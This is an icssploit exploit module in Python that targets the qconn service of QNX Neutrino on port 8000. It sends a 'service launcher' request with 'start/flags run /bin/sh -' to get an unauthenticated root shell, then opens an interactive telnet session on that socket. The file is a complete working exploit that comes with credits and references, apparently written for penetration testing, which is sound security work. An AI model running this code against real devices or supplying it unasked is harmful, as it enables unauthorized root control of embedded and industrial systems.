from icssploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    mute,
    validators,
)
import telnetlib
import socket
import time


class Exploit(exploits.Exploit):
    __info__ = {
        'name': 'QNX QCONN Remote Command Execution Vulnerabilit',
        'authors': [
            'David Odell',  # Discovery
            'Mor!p3r <moriper[at]gmail.com>',  # PoC
            'Brendan Coles <bcoles[at]gmail.com>'  # Metasploit
            'wenzhe zhu <jtrkid[at]gmail.com>',  # isfmodule
        ],
        'description': 'This module exploits a vulnerability in the qconn component of '
                       'QNX Neutrino which can be abused to allow unauthenticated users '
                       'to execute arbitrary commands under the context of the "root" user.',
        'references': [
            'OSVDB: 86672',
            'EDB: 21520',
            'http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos',
            'http://www.qnx.com/developers/docs/6.3.0SP3/neutrino/utilities/q/qconn.html'
        ],
        'devices': [
            'QNX SDP 660',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
    command = exploits.Option('/bin/sh -', 'command to run e.g. /bin/sh -')
    port = exploits.Option(8000, 'Target Port', validators=validators.integer)

    def exploit(self):
        req = "service launcher\n"
        req += "start/flags run %s\n" % self.command
        sock = socket.socket()
        sock.connect((self.target, self.port))
        sock.send(req)
        t = telnetlib.Telnet()
        t.sock = sock
        t.interact()

    def run(self):
        if self._check_alive():
            print_success("Target is alive")
            print_status("Sending packet to target")
            self.exploit()
            if not self._check_alive():
                print_success("Target port is down")
        else:
            print_error("Target port is not alive")

    @mute
    # TODO: Add check later
    def check(self):
        pass

    def _check_alive(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.close()
        except Exception:
            return False
        return True

